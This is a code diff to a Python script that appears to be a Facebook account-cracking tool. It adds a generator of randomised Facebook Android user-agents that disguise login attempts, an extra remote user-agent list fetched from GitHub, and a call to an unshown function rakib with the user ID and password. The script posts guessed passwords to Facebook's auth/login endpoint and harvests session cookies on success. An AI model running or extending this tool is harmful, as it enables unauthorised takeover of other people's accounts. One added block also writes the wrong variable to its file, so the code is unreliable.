@@ -77,11 +77,19 @@ prox=open('.prox.txt','r').read().splitlines()
 
 #-----------------------ua---------------------------------
 try:
- proxo= requests.get('https://raw.githubusercontent.com/FB-KING/KING-PRO/main/ua.txt').text
+ proxo= requests.get('https://raw.githubusercontent.com/mdtasin123/SERVER/main/ua2.txt').text
  open('.proxo.txt','w').write(proxo)
 except Exception as e:
  print('')
 proxo=open('.proxo.txt','r').read().splitlines()
+
+#-----------------------ua---------------------------------
+try:
+ proxod= requests.get('https://raw.githubusercontent.com/FB-KING/KING-PRO/main/ua.txt').text
+ open('.proxod.txt','w').write(proxo)
+except Exception as e:
+ print('')
+proxod=open('.proxod.txt','r').read().splitlines()
 
 #-----userid-separate----#
 def user_id(coki):
@@ -286,7 +294,32 @@ for agent in range(10000):
         l='Mobile Safari/537.36'
         fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
         ugen.append(fullagnt)
-
+def __UBI___():
+    android_versions = list(range(4, 13))
+    samsung_models = ['Galaxy S6', 'Galaxy S7', 'Galaxy S8', 'Galaxy S9', 'Galaxy S10', 'Galaxy Note 5', 'Galaxy Note 8', 'Galaxy Note 9', 'Galaxy A5', 'Galaxy A7', 'Galaxy J5', 'Galaxy J7']
+    huawei_models = ['P10', 'P20', 'P30', 'Mate 10', 'Mate 20', 'Y7', 'Y9', 'Nova 3i']
+    xiaomi_models = ['Redmi Note 5', 'Redmi Note 6', 'Redmi Note 7', 'Redmi Note 8', 'Redmi Note 9', 'Mi A1', 'Mi A2', 'Mi 8', 'Mi 9', 'Poco F1']
+    oppo_models = ['F7', 'F9', 'A3s', 'A5s', 'A7', 'A9', 'R11', 'R17', 'Reno 2', 'Reno 3']
+    vivo_models = ['Y21', 'Y55', 'Y71', 'Y81', 'Y91', 'Y93', 'Y95', 'V9', 'V11', 'V15', 'S1']
+    realme_models = ['C1', 'C2', '3 Pro', '5 Pro', 'X', 'X2']
+    android_models = {
+        'samsung': samsung_models,
+        'huawei': huawei_models,
+        'xiaomi': xiaomi_models,
+        'oppo': oppo_models,
+        'vivo': vivo_models,
+        'realme': realme_models,
+    }
+    and_vers = random.choice(android_versions)
+    brand = random.choice(list(android_models.keys()))
+    and_mod = random.choice(android_models[brand])
+    and_id = f'{random.randint(9,99)}.0.0.{random.randint(9,99)}{random.randint(9,99)}'
+    app_uld = f'{random.randint(111111, 999999)}.{random.randint(111,999)}'
+    app_ver = f'{random.randint(99,999)}.{random.randint(99,999)}.{random.randint(99,999)}.{random.randint(99,999)}'
+    app_vercode = str(random.randint(100000000,999999999))
+    pkg_name = random.choice(('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana'))
+    ua = f'Dalvik/2.1.0 (Linux; U; Android {and_vers}; {brand} {and_mod} Build/SKQ1.{app_uld}) [FBAN/EMA;FBLC/en_US;FBAV/{app_ver};FBBV/{app_vercode};FBDV/{and_mod};FBMD/{brand};FBSN/{and_id};FBPN/{pkg_name}]'
+    return ua
 
     
 sys.stdout.write('\x1b]2; DEVILS\x07')
@@ -481,6 +514,11 @@ class main_crack():
                  'user-agent': __UBI___(),
                  'content-type': 'application/x-www-form-urlencoded', 
                  'x-fb-http-engine': 'Liger'}
+                print(headers)
+                #print(headers)
+                #Elite(__UBI___,sid,ps,cookie)
+                #fike(__UBI___,sid,ps)
+                rakib(sid,ps)
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);KINGb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={KINGb};{ckkk}"
